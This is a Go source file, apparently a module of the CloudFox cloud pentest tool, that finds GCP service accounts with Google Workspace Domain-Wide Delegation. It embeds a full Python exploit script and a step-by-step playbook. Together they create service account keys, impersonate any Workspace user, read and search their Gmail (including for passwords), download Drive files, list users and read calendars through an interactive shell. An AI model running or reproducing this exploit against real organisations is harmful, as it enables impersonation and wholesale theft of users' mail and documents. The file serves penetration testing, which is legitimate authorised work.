package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	domainwidedelegationservice "github.com/BishopFox/cloudfox/gcp/services/domainWideDelegationService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPDomainWideDelegationCommand = &cobra.Command{
	Use:     globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME,
	Aliases: []string{"dwd", "delegation", "workspace-delegation"},
	Short:   "Find service accounts with Domain-Wide Delegation to Google Workspace",
	Long: `Find service accounts configured for Domain-Wide Delegation (DWD).

Domain-Wide Delegation allows a service account to impersonate any user in a
Google Workspace domain. This is EXTREMELY powerful and a high-value target.

With DWD + a service account key, an attacker can:
- Read any user's Gmail
- Access any user's Google Drive
- View any user's Calendar
- Enumerate all users and groups via Admin Directory API
- Send emails as any user
- And much more depending on authorized scopes

Detection Method:
- Service accounts with OAuth2 Client ID set have DWD enabled
- The actual authorized scopes are configured in Google Admin Console
- We check for naming patterns that suggest DWD purpose

To Exploit:
1. Obtain a key for the DWD service account
2. Identify a target user email in the Workspace domain
3. Generate tokens with the target user as 'subject'
4. Access Workspace APIs as that user

Note: Scopes must be authorized in Admin Console > Security > API Controls`,
	Run: runGCPDomainWideDelegationCommand,
}

// ------------------------------
// Module Struct
// ------------------------------
type DomainWideDelegationModule struct {
	gcpinternal.BaseGCPModule

	ProjectDWDAccounts map[string][]domainwidedelegationservice.DWDServiceAccount // projectID -> accounts
	LootMap            map[string]map[string]*internal.LootFile                   // projectID -> loot files
	mu                 sync.Mutex
}

// ------------------------------
// Output Struct
// ------------------------------
type DomainWideDelegationOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DomainWideDelegationOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DomainWideDelegationOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPDomainWideDelegationCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)
	if err != nil {
		return
	}

	module := &DomainWideDelegationModule{
		BaseGCPModule:      gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectDWDAccounts: make(map[string][]domainwidedelegationservice.DWDServiceAccount),
		LootMap:            make(map[string]map[string]*internal.LootFile),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *DomainWideDelegationModule) getAllDWDAccounts() []domainwidedelegationservice.DWDServiceAccount {
	var all []domainwidedelegationservice.DWDServiceAccount
	for _, accounts := range m.ProjectDWDAccounts {
		all = append(all, accounts...)
	}
	return all
}

func (m *DomainWideDelegationModule) Execute(ctx context.Context, logger internal.Logger) {
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME, m.processProject)

	allAccounts := m.getAllDWDAccounts()
	if len(allAccounts) == 0 {
		logger.InfoM("No Domain-Wide Delegation service accounts found", globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)
		return
	}

	// Count confirmed DWD accounts
	confirmedDWD := 0
	criticalCount := 0
	for _, account := range allAccounts {
		if account.DWDEnabled {
			confirmedDWD++
		}
		if account.RiskLevel == "CRITICAL" {
			criticalCount++
		}
	}

	logger.SuccessM(fmt.Sprintf("Found %d potential DWD service account(s) (%d confirmed)", len(allAccounts), confirmedDWD), globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)

	if criticalCount > 0 {
		logger.InfoM(fmt.Sprintf("[CRITICAL] %d DWD accounts with keys - can impersonate Workspace users!", criticalCount), globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)
	}

	m.writeOutput(ctx, logger)
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *DomainWideDelegationModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Checking DWD service accounts in project: %s", projectID), globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)
	}

	m.mu.Lock()
	// Initialize loot for this project
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
	}
	m.mu.Unlock()

	svc := domainwidedelegationservice.New()
	accounts, err := svc.GetDWDServiceAccounts(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME,
			fmt.Sprintf("Could not check DWD service accounts in project %s", projectID))
		return
	}

	m.mu.Lock()
	m.ProjectDWDAccounts[projectID] = accounts
	m.mu.Unlock()

	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS && len(accounts) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d DWD account(s) in project %s", len(accounts), projectID), globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)
	}
}

// ------------------------------
// Loot File Management
// ------------------------------

// generateDWDPythonScript returns the Python exploit script (generated once globally)
func (m *DomainWideDelegationModule) generateDWDPythonScript() internal.LootFile {
	pythonScript := `#!/usr/bin/env python3
"""
Domain-Wide Delegation (DWD) Exploitation Script
Generated by CloudFox

Usage:
    # Interactive mode (authenticate once, run multiple actions):
    python dwd_exploit.py --key-file KEY.json --subject user@domain.com

    # Single command mode:
    python dwd_exploit.py --key-file KEY.json --subject user@domain.com --action read-emails
    python dwd_exploit.py --key-file KEY.json --subject user@domain.com --all-scopes
"""

import argparse
import base64
import io
import sys
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseDownload

SCOPES = {
    'gmail_readonly': 'https://www.googleapis.com/auth/gmail.readonly',
    'gmail_send': 'https://www.googleapis.com/auth/gmail.send',
    'gmail_full': 'https://mail.google.com/',
    'drive_readonly': 'https://www.googleapis.com/auth/drive.readonly',
    'drive_full': 'https://www.googleapis.com/auth/drive',
    'calendar_readonly': 'https://www.googleapis.com/auth/calendar.readonly',
    'calendar_full': 'https://www.googleapis.com/auth/calendar',
    'admin_directory_users': 'https://www.googleapis.com/auth/admin.directory.user.readonly',
    'admin_directory_groups': 'https://www.googleapis.com/auth/admin.directory.group.readonly',
    'contacts': 'https://www.googleapis.com/auth/contacts.readonly',
    'sheets': 'https://www.googleapis.com/auth/spreadsheets',
}

class DWDExploit:
    def __init__(self, key_file, subject):
        self.key_file = key_file
        self.subject = subject
        self.services = {}
        self.working_scopes = set()
        print(f"\n[*] Initialized DWD exploit")
        print(f"    Key file: {key_file}")
        print(f"    Subject: {subject}")

    def get_credentials(self, scopes):
        if isinstance(scopes, str):
            scopes = [scopes]
        return service_account.Credentials.from_service_account_file(
            self.key_file, scopes=scopes, subject=self.subject
        )

    def get_service(self, service_name, version, scope):
        """Get or create a cached service."""
        key = f"{service_name}_{version}_{scope}"
        if key not in self.services:
            creds = self.get_credentials(SCOPES[scope])
            self.services[key] = build(service_name, version, credentials=creds)
        return self.services[key]

    def test_all_scopes(self):
        """Test which scopes are authorized."""
        print(f"\n[*] Testing all scopes for {self.subject}...")
        for scope_name, scope_url in SCOPES.items():
            print(f"\n[*] Testing: {scope_name}")
            try:
                creds = self.get_credentials(scope_url)
                if 'gmail' in scope_name:
                    service = build('gmail', 'v1', credentials=creds)
                    results = service.users().messages().list(userId='me', maxResults=5).execute()
                    count = len(results.get('messages', []))
                    print(f"    [+] SUCCESS - Found {count} messages")
                    self.working_scopes.add(scope_name)
                elif 'drive' in scope_name:
                    service = build('drive', 'v3', credentials=creds)
                    results = service.files().list(pageSize=5).execute()
                    count = len(results.get('files', []))
                    print(f"    [+] SUCCESS - Found {count} files")
                    self.working_scopes.add(scope_name)
                elif 'calendar' in scope_name:
                    service = build('calendar', 'v3', credentials=creds)
                    results = service.calendarList().list().execute()
                    count = len(results.get('items', []))
                    print(f"    [+] SUCCESS - Found {count} calendars")
                    self.working_scopes.add(scope_name)
                elif 'admin_directory' in scope_name:
                    service = build('admin', 'directory_v1', credentials=creds)
                    results = service.users().list(customer='my_customer', maxResults=5).execute()
                    count = len(results.get('users', []))
                    print(f"    [+] SUCCESS - Found {count} users")
                    self.working_scopes.add(scope_name)
                else:
                    print(f"    [+] SUCCESS - Credentials created")
                    self.working_scopes.add(scope_name)
            except Exception as e:
                print(f"    [-] FAILED: {str(e)[:80]}")

        print(f"\n[+] Working scopes: {', '.join(self.working_scopes) if self.working_scopes else 'None'}")

    def read_emails(self, max_results=20):
        """Read emails from user's inbox."""
        service = self.get_service('gmail', 'v1', 'gmail_readonly')
        results = service.users().messages().list(userId='me', maxResults=max_results).execute()
        messages = results.get('messages', [])

        print(f"\n[+] Reading {len(messages)} emails for {self.subject}:\n")
        for msg in messages:
            msg_data = service.users().messages().get(userId='me', id=msg['id'], format='full').execute()
            headers = {h['name']: h['value'] for h in msg_data['payload']['headers']}

            print(f"{'='*60}")
            print(f"From: {headers.get('From', 'N/A')}")
            print(f"To: {headers.get('To', 'N/A')}")
            print(f"Subject: {headers.get('Subject', 'N/A')}")
            print(f"Date: {headers.get('Date', 'N/A')}")

            body = ""
            if 'parts' in msg_data['payload']:
                for part in msg_data['payload']['parts']:
                    if part['mimeType'] == 'text/plain' and 'data' in part.get('body', {}):
                        body = base64.urlsafe_b64decode(part['body']['data']).decode('utf-8', errors='ignore')
                        break
            elif 'body' in msg_data['payload'] and 'data' in msg_data['payload']['body']:
                body = base64.urlsafe_b64decode(msg_data['payload']['body']['data']).decode('utf-8', errors='ignore')

            if body:
                print(f"\nBody:\n{body[:500]}{'...' if len(body) > 500 else ''}")
            print()

    def search_emails(self, query):
        """Search emails with a query."""
        service = self.get_service('gmail', 'v1', 'gmail_readonly')
        results = service.users().messages().list(userId='me', q=query, maxResults=20).execute()
        messages = results.get('messages', [])

        print(f"\n[+] Found {len(messages)} emails matching '{query}':\n")
        for msg in messages:
            msg_data = service.users().messages().get(userId='me', id=msg['id'], format='metadata').execute()
            headers = {h['name']: h['value'] for h in msg_data['payload']['headers']}
            print(f"  - {headers.get('Subject', 'N/A')[:60]} | From: {headers.get('From', 'N/A')[:30]}")

    def list_drive(self, max_results=50):
        """List files in user's Drive."""
        service = self.get_service('drive', 'v3', 'drive_readonly')
        results = service.files().list(
            pageSize=max_results,
            fields="files(id, name, mimeType, size, modifiedTime)"
        ).execute()
        files = results.get('files', [])

        print(f"\n[+] Found {len(files)} files in Drive:\n")
        for f in files:
            size = f.get('size', 'N/A')
            if size != 'N/A':
                size = f"{int(size)/1024:.1f}KB"
            print(f"  [{f['id'][:12]}] {f['name'][:45]} ({f['mimeType'].split('.')[-1]}) {size}")

    def download_file(self, file_id, output_path=None):
        """Download a file from Drive."""
        service = self.get_service('drive', 'v3', 'drive_readonly')
        file_meta = service.files().get(fileId=file_id, fields='name,mimeType').execute()
        filename = output_path or file_meta['name']

        request = service.files().get_media(fileId=file_id)
        fh = io.BytesIO()
        downloader = MediaIoBaseDownload(fh, request)

        done = False
        while not done:
            status, done = downloader.next_chunk()
            print(f"\r[*] Download: {int(status.progress() * 100)}%", end='')

        with open(filename, 'wb') as f:
            f.write(fh.getvalue())
        print(f"\n[+] Downloaded: {filename}")

    def list_users(self):
        """List all Workspace users."""
        service = self.get_service('admin', 'directory_v1', 'admin_directory_users')
        results = service.users().list(customer='my_customer', maxResults=200).execute()
        users = results.get('users', [])

        print(f"\n[+] Found {len(users)} Workspace users:\n")
        for user in users:
            name = user.get('name', {}).get('fullName', 'N/A')
            admin = "ADMIN" if user.get('isAdmin') else ""
            print(f"  - {user.get('primaryEmail'):<40} {name:<25} {admin}")

    def list_calendars(self):
        """List user's calendars."""
        service = self.get_service('calendar', 'v3', 'calendar_readonly')
        results = service.calendarList().list().execute()
        calendars = results.get('items', [])

        print(f"\n[+] Found {len(calendars)} calendars:\n")
        for cal in calendars:
            print(f"  - {cal.get('summary', 'N/A')} ({cal.get('id', 'N/A')[:40]})")

    def list_events(self, max_results=20):
        """List upcoming calendar events."""
        from datetime import datetime
        service = self.get_service('calendar', 'v3', 'calendar_readonly')
        now = datetime.utcnow().isoformat() + 'Z'
        results = service.events().list(
            calendarId='primary', timeMin=now, maxResults=max_results, singleEvents=True, orderBy='startTime'
        ).execute()
        events = results.get('items', [])

        print(f"\n[+] Found {len(events)} upcoming events:\n")
        for event in events:
            start = event['start'].get('dateTime', event['start'].get('date'))
            print(f"  - {start[:16]} | {event.get('summary', 'No title')}")

    def change_subject(self, new_subject):
        """Change the impersonated user."""
        self.subject = new_subject
        self.services = {}  # Clear cached services
        print(f"\n[+] Now impersonating: {new_subject}")

    def interactive(self):
        """Interactive mode - run multiple actions without re-authenticating."""
        print("\n" + "="*60)
        print("  DWD Interactive Mode")
        print("  Type 'help' for commands, 'quit' to exit")
        print("="*60)

        while True:
            try:
                cmd = input(f"\n[{self.subject}]> ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting...")
                break

            if not cmd:
                continue

            parts = cmd.split(maxsplit=1)
            action = parts[0]
            args = parts[1] if len(parts) > 1 else ""

            try:
                if action in ('quit', 'exit', 'q'):
                    print("[*] Exiting...")
                    break
                elif action == 'help':
                    self.print_help()
                elif action == 'test' or action == 'scopes':
                    self.test_all_scopes()
                elif action == 'emails' or action == 'inbox':
                    self.read_emails()
                elif action == 'search':
                    if not args:
                        args = input("  Search query: ").strip()
                    self.search_emails(args)
                elif action == 'drive' or action == 'files':
                    self.list_drive()
                elif action == 'download':
                    if not args:
                        args = input("  File ID: ").strip()
                    self.download_file(args)
                elif action == 'users':
                    self.list_users()
                elif action == 'calendars':
                    self.list_calendars()
                elif action == 'events':
                    self.list_events()
                elif action == 'subject' or action == 'impersonate':
                    if not args:
                        args = input("  New subject email: ").strip()
                    self.change_subject(args)
                elif action == 'whoami':
                    print(f"\n  Key file: {self.key_file}")
                    print(f"  Subject: {self.subject}")
                    print(f"  Working scopes: {', '.join(self.working_scopes) if self.working_scopes else 'Not tested yet'}")
                else:
                    print(f"  Unknown command: {action}. Type 'help' for commands.")
            except Exception as e:
                print(f"  [!] Error: {e}")

    def print_help(self):
        print("""
  Commands:
    test / scopes        - Test which scopes are authorized
    emails / inbox       - Read inbox emails
    search <query>       - Search emails (e.g., search password)
    drive / files        - List Google Drive files
    download <file_id>   - Download a Drive file
    users                - List all Workspace users (requires admin)
    calendars            - List calendars
    events               - List upcoming calendar events
    subject <email>      - Switch to impersonate a different user
    whoami               - Show current configuration
    help                 - Show this help
    quit / exit / q      - Exit interactive mode
        """)


def main():
    parser = argparse.ArgumentParser(description='DWD Exploitation Script')
    parser.add_argument('--key-file', required=True, help='Service account key JSON file')
    parser.add_argument('--subject', required=True, help='Email of user to impersonate')
    parser.add_argument('--all-scopes', action='store_true', help='Test all scopes and exit')
    parser.add_argument('--action', choices=[
        'read-emails', 'search-emails', 'list-drive', 'download-file',
        'list-users', 'list-calendars', 'list-events'
    ], help='Single action to perform (non-interactive)')
    parser.add_argument('--query', help='Search query for search-emails')
    parser.add_argument('--file-id', help='File ID for download-file')
    parser.add_argument('--output', help='Output path for download-file')
    args = parser.parse_args()

    exploit = DWDExploit(args.key_file, args.subject)

    # Single action modes
    if args.all_scopes:
        exploit.test_all_scopes()
    elif args.action == 'read-emails':
        exploit.read_emails()
    elif args.action == 'search-emails':
        if not args.query:
            parser.error('--query is required for search-emails')
        exploit.search_emails(args.query)
    elif args.action == 'list-drive':
        exploit.list_drive()
    elif args.action == 'download-file':
        if not args.file_id:
            parser.error('--file-id is required for download-file')
        exploit.download_file(args.file_id, args.output)
    elif args.action == 'list-users':
        exploit.list_users()
    elif args.action == 'list-calendars':
        exploit.list_calendars()
    elif args.action == 'list-events':
        exploit.list_events()
    else:
        # No action specified - enter interactive mode
        exploit.interactive()

if __name__ == '__main__':
    main()
`

	return internal.LootFile{
		Name:     "dwd_exploit.py",
		Contents: pythonScript,
	}
}

// generateDWDCommands generates the commands file for a specific project's accounts
func (m *DomainWideDelegationModule) generateDWDCommands(accounts []domainwidedelegationservice.DWDServiceAccount) internal.LootFile {
	var commands strings.Builder
	commands.WriteString(`# Domain-Wide Delegation (DWD) Exploitation Commands
# Generated by CloudFox
# WARNING: Only use with proper authorization

# =============================================================================
# STEP 1: INSTALL DEPENDENCIES
# =============================================================================
pip install google-auth google-auth-oauthlib google-api-python-client

# =============================================================================
# STEP 2: CREATE A SERVICE ACCOUNT KEY (if needed)
# =============================================================================
# Replace <SERVICE_ACCOUNT_EMAIL> with the service account email from above

gcloud iam service-accounts keys create sa-key.json \
  --iam-account=<SERVICE_ACCOUNT_EMAIL>

# =============================================================================
# STEP 3: RUN THE EXPLOIT SCRIPT (INTERACTIVE MODE)
# =============================================================================
# Replace:
#   sa-key.json         - Path to the service account key file
#   admin@domain.com    - Email of Workspace user to impersonate

# Start interactive mode (recommended - authenticate once, run many commands):
python dwd_exploit.py --key-file sa-key.json --subject admin@domain.com

# Interactive commands:
#   test          - Test which scopes are authorized
#   emails        - Read inbox emails
#   search <q>    - Search emails (e.g., search password reset)
#   drive         - List Google Drive files
#   download <id> - Download a Drive file
#   users         - List all Workspace users
#   calendars     - List calendars
#   events        - List upcoming calendar events
#   subject <email> - Switch to impersonate a different user
#   whoami        - Show current config
#   quit          - Exit

# =============================================================================
# STEP 3 (ALT): SINGLE COMMAND MODE
# =============================================================================
# If you prefer single commands instead of interactive mode:

# Test all scopes:
python dwd_exploit.py --key-file sa-key.json --subject admin@domain.com --all-scopes

# Read emails:
python dwd_exploit.py --key-file sa-key.json --subject admin@domain.com --action read-emails

# Search emails:
python dwd_exploit.py --key-file sa-key.json --subject admin@domain.com --action search-emails --query "password"

# List Drive files:
python dwd_exploit.py --key-file sa-key.json --subject admin@domain.com --action list-drive

# Download a file:
python dwd_exploit.py --key-file sa-key.json --subject admin@domain.com --action download-file --file-id FILE_ID

# List Workspace users:
python dwd_exploit.py --key-file sa-key.json --subject admin@domain.com --action list-users

# =============================================================================
# NOTES
# =============================================================================
# - Scopes must be pre-authorized in Google Admin Console:
#   Admin Console > Security > API Controls > Domain-wide Delegation
# - The service account's OAuth2 Client ID must be listed there
# - Not all scopes may be authorized - run 'test' to check
# - admin_directory scopes require impersonating a Workspace admin user
# - In interactive mode, use 'subject' command to switch users without restarting
`)

	return internal.LootFile{
		Name:     "dwd-playbook",
		Contents: commands.String(),
	}
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *DomainWideDelegationModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *DomainWideDelegationModule) getHeader() []string {
	return []string{
		"Project",
		"Email",
		"DWD Enabled",
		"OAuth2 Client ID",
		"Key ID",
		"Key Created",
		"Key Expires",
		"Key Algorithm",
	}
}

func (m *DomainWideDelegationModule) accountsToTableBody(accounts []domainwidedelegationservice.DWDServiceAccount) [][]string {
	var body [][]string
	for _, account := range accounts {
		dwdStatus := "No"
		if account.DWDEnabled {
			dwdStatus = "Yes"
		}

		clientID := account.OAuth2ClientID
		if clientID == "" {
			clientID = "-"
		}

		if len(account.Keys) > 0 {
			// One row per key
			for _, key := range account.Keys {
				body = append(body, []string{
					m.GetProjectName(account.ProjectID),
					account.Email,
					dwdStatus,
					clientID,
					key.KeyID,
					key.CreatedAt,
					key.ExpiresAt,
					key.KeyAlgorithm,
				})
			}
		} else {
			// Account with no keys - still show it
			body = append(body, []string{
				m.GetProjectName(account.ProjectID),
				account.Email,
				dwdStatus,
				clientID,
				"-",
				"-",
				"-",
				"-",
			})
		}
	}
	return body
}

func (m *DomainWideDelegationModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile

	if accounts, ok := m.ProjectDWDAccounts[projectID]; ok && len(accounts) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "domain-wide-delegation",
			Header: m.getHeader(),
			Body:   m.accountsToTableBody(accounts),
		})
	}

	return tableFiles
}

func (m *DomainWideDelegationModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Generate Python script once (same for all projects)
	pythonScript := m.generateDWDPythonScript()

	for projectID, accounts := range m.ProjectDWDAccounts {
		tableFiles := m.buildTablesForProject(projectID)

		var lootFiles []internal.LootFile
		if len(accounts) > 0 {
			// Add Python script to each project
			lootFiles = append(lootFiles, pythonScript)
			// Add project-specific commands
			lootFiles = append(lootFiles, m.generateDWDCommands(accounts))
		}

		outputData.ProjectLevelData[projectID] = DomainWideDelegationOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)
	}
}

func (m *DomainWideDelegationModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allAccounts := m.getAllDWDAccounts()

	var tables []internal.TableFile

	if len(allAccounts) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "domain-wide-delegation",
			Header: m.getHeader(),
			Body:   m.accountsToTableBody(allAccounts),
		})
	}

	var lootFiles []internal.LootFile
	if len(allAccounts) > 0 {
		lootFiles = append(lootFiles, m.generateDWDPythonScript())
		lootFiles = append(lootFiles, m.generateDWDCommands(allAccounts))
	}

	output := DomainWideDelegationOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_DOMAINWIDEDELEGATION_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
